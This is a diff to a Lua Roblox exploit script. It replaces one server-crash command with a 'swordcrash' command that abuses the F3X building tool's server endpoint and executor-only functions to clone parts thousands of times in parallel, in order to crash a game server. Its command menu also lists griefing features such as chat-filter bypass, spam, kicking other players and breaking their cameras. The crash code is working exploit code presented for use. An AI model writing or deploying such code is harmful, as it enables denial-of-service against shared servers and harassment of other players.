@@ -327,7 +327,6 @@ spawn(function()
 
             if antis.antibring and not respawnedRecently then
                 if lastPos and (pos - lastPos).Magnitude > 20 then
-                    -- check if near a player
                     local nearestPlayer = nil
                     local minDist = math.huge
                     for _, p in ipairs(Players:GetPlayers()) do
@@ -1090,30 +1089,116 @@ addcommand("slag", "Server lag (2 stones)", function()
 end)
 addcommand("serverlag", "", function(args) commands["slag"](args) end)
 
-addcommand("servercrash", "Crash server with many blocks", function()
-    local tool = plr.Backpack:FindFirstChild("Building Tools") or (plr.Character and plr.Character:FindFirstChild("Building Tools"))
-    if not tool then
+-- Swordcrash command (replaces servercrash)
+addcommand("swordcrash", "Crash server with sword clone exploit", function()
+    -- Ensure F3X exists (only give if missing)
+    local f3x = plr.Backpack:FindFirstChild("Building Tools") or (plr.Character and plr.Character:FindFirstChild("Building Tools"))
+    if not f3x then
         tchat("f3x")
         task.wait(2)
-        tool = plr.Backpack:FindFirstChild("Building Tools") or (plr.Character and plr.Character:FindFirstChild("Building Tools"))
+        f3x = plr.Backpack:FindFirstChild("Building Tools") or (plr.Character and plr.Character:FindFirstChild("Building Tools"))
     end
-    if not tool then WindUI:Notify({Title="†Køhlsîfy", Content="You no have F3X", Duration=3}) return end
+    if not f3x then
+        WindUI:Notify({Title="†Køhlsîfy", Content="You no have F3X", Duration=3})
+        return
+    end
+
+    -- Ensure Dragonheart Sword & Shield exists
+    local sword = plr.Backpack:FindFirstChild("Dragonheart Sword & Shield") or (plr.Character and plr.Character:FindFirstChild("Dragonheart Sword & Shield"))
+    if not sword then
+        tchat("give me 00000000000000000000000000000172298750")
+        task.wait(2)
+        sword = plr.Backpack:FindFirstChild("Dragonheart Sword & Shield") or (plr.Character and plr.Character:FindFirstChild("Dragonheart Sword & Shield"))
+    end
+    if not sword then
+        WindUI:Notify({Title="†Køhlsîfy", Content="You no have Dragonheart Sword & Shield", Duration=3})
+        return
+    end
+
+    -- Equip sword, drop, pick up, unequip
+    if plr.Backpack:FindFirstChild("Dragonheart Sword & Shield") then
+        plr.Backpack["Dragonheart Sword & Shield"].Parent = plr.Character
+    end
+    task.wait(0.5)
+    tchat("droptool")
+    task.wait(0.5)
+    local dropped = workspace:FindFirstChild("Dragonheart Sword & Shield")
+    if dropped then
+        local head = plr.Character:FindFirstChild("Head")
+        if head and firetouchinterest then
+            firetouchinterest(head, dropped, 1)
+            firetouchinterest(head, dropped, 0)
+        end
+    end
+    task.wait(0.5)
+    -- Unequip sword if still in character
+    local swordInChar = plr.Character:FindFirstChild("Dragonheart Sword & Shield")
+    if swordInChar then
+        swordInChar.Parent = plr.Backpack
+    end
+
+    -- Equip F3X
     if plr.Backpack:FindFirstChild("Building Tools") then
         plr.Backpack["Building Tools"].Parent = plr.Character
+    elseif not (plr.Character and plr.Character:FindFirstChild("Building Tools")) then
+        WindUI:Notify({Title="†Køhlsîfy", Content="F3X not found after give", Duration=3})
+        return
     end
-    local api = workspace.nowhudhejeir["Building Tools"].SyncAPI.ServerEndpoint
-    local pos = CFrame.new(-99999, -99999, -99999)
-    for i = 1, 100000 do
-        spawn(function()
-            pcall(function()
-                api:InvokeServer("CreatePart", "Normal", pos, workspace.Tabby.Admin_House)
-            end)
-        end)
+
+    local f3xTool = plr.Character:FindFirstChild("Building Tools") or plr.Backpack:FindFirstChild("Building Tools")
+    if not f3xTool then return end
+
+    -- First clone phase: clone Left Arm 1000 times
+    local function GetNil(Name, DebugId)
+        for _, Object in getnilinstances() do
+            if Object.Name == Name and Object:GetDebugId() == DebugId then
+                return Object
+            end
+        end
     end
-    WindUI:Notify({Title="†Køhlsîfy", Content="Server crash initiated!", Duration=3})
+
+    spawn(function()
+        local api = f3xTool:FindFirstChild("SyncAPI") and f3xTool.SyncAPI:FindFirstChild("ServerEndpoint")
+        if not api then
+            -- fallback to Backpack index 6 if exists
+            local bp = plr.Backpack:GetChildren()
+            if bp[6] and bp[6]:FindFirstChild("SyncAPI") then
+                api = bp[6].SyncAPI.ServerEndpoint
+            end
+        end
+        if api then
+            local leftArm = GetNil("Left Arm", "1_951445")
+            if leftArm then
+                for i = 1, 1000 do
+                    pcall(function()
+                        api:InvokeServer("Clone", {leftArm}, plr.Character)
+                    end)
+                end
+            end
+        end
+    end)
+
+    -- Second clone phase: clone player's Left Arm 1000 times
+    spawn(function()
+        local api = GetNil("ServerEndpoint", "1_942552")
+        if api then
+            local playerModel = workspace:FindFirstChild(plr.Name)
+            if playerModel then
+                local leftArm = playerModel:FindFirstChild("Left Arm")
+                if leftArm then
+                    for i = 1, 1000 do
+                        pcall(function()
+                            api:InvokeServer("Clone", {leftArm}, playerModel)
+                        end)
+                    end
+                end
+            end
+        end
+    end)
+
+    WindUI:Notify({Title="†Køhlsîfy", Content="Swordcrash initiated!", Duration=3})
 end)
-addcommand("crash", "", function(args) commands["servercrash"](args) end)
-addcommand("shutdown", "", function(args) commands["servercrash"](args) end)
+addcommand("scrash", "", function(args) commands["swordcrash"](args) end)
 
 addcommand("r15", "Switch to R15", function() tchat("!experiment adaptiver6 on") task.wait(2) tchat("unchar me") end)
 addcommand("r6", "Switch to R6", function() tchat("!experiment adaptiver6 off") end)
@@ -1224,7 +1309,7 @@ end)
 local __commandsTab = Window:Tab({ Title = "Commands", Icon = "lucide:terminal" })
 __commandsTab:Paragraph({
     Title = "Commands 1",
-    Desc = "ban <player> [reason] - blacklist & kick\nunban <player> - unblacklist\nfpunish <player> - fake punish\nkick <player> [reason] - hot potato kick\nkid <player> - make kid\nspam <msg> - spam\nunspam - stop spam\nfixfilter - fix filter\nbypassmessage <msg> - bypass filter (system)\ncage <player> - cage\nloopcage <player> - loop cage\nunloopcage <player> - stop loop\ngearbl/gearban/gearblacklist <player> - gear ban\nungearbl <player> - ungear ban\nnok - disable obby touch\nclrall/clr - delete all workspace parts\nfix - remove problematic seats and spawns\nunlockworkspace/unlockws - unlock all parts\nnocam - break camera\nfcam <player> - break player's camera\nfixcam - fix camera\nslag/serverlag - lag server\nservercrash/crash/shutdown - crash server"
+    Desc = "ban <player> [reason] - blacklist & kick\nunban <player> - unblacklist\nfpunish <player> - fake punish\nkick <player> [reason] - hot potato kick\nkid <player> - make kid\nspam <msg> - spam\nunspam - stop spam\nfixfilter - fix filter\nbypassmessage <msg> - bypass filter (system)\ncage <player> - cage\nloopcage <player> - loop cage\nunloopcage <player> - stop loop\ngearbl/gearban/gearblacklist <player> - gear ban\nungearbl <player> - ungear ban\nnok - disable obby touch\nclrall/clr - delete all workspace parts\nfix - remove problematic seats and spawns\nunlockworkspace/unlockws - unlock all parts\nnocam - break camera\nfcam <player> - break player's camera\nfixcam - fix camera\nslag/serverlag - lag server\nswordcrash/scrash - crash server (sword exploit)"
 })
 
 __commandsTab:Paragraph({
@@ -1255,7 +1340,7 @@ __protectTab:Toggle({ Title = "Anti BanHammer", Value = antis.antibanhammer, Cal
 __protectTab:Toggle({ Title = "Anti GearBan", Value = antis.antigearban, Callback = function(v) antis.antigearban = v saveConfig() end })
 __protectTab:Toggle({ Title = "Anti Fling", Value = antis.antifling, Callback = function(v) antis.antifling = v saveConfig() end })
 __protectTab:Toggle({ Title = "Anti Bring", Value = antis.antibring, Callback = function(v) antis.antibring = v saveConfig() end })
-__protectTab:Toggle({ Title = "Anti Respawn", Value = antis.antirespawn, Callback = function(v) antis.antirespawn = v saveConfig() end })
+__protectTab:Toggle({ Title = "Anti Respawn (enable Anti Bring to use)", Value = antis.antirespawn, Callback = function(v) antis.antirespawn = v saveConfig() end })
 
 local __mainTab = Window:Tab({ Title = "Main", Icon = "home" })
 __mainTab:Toggle({ Title = "Perm", Value = permEnabled, Callback = function(v) permEnabled = v if v then permLoop() else if permCoroutine then task.cancel(permCoroutine) end end saveConfig() end })
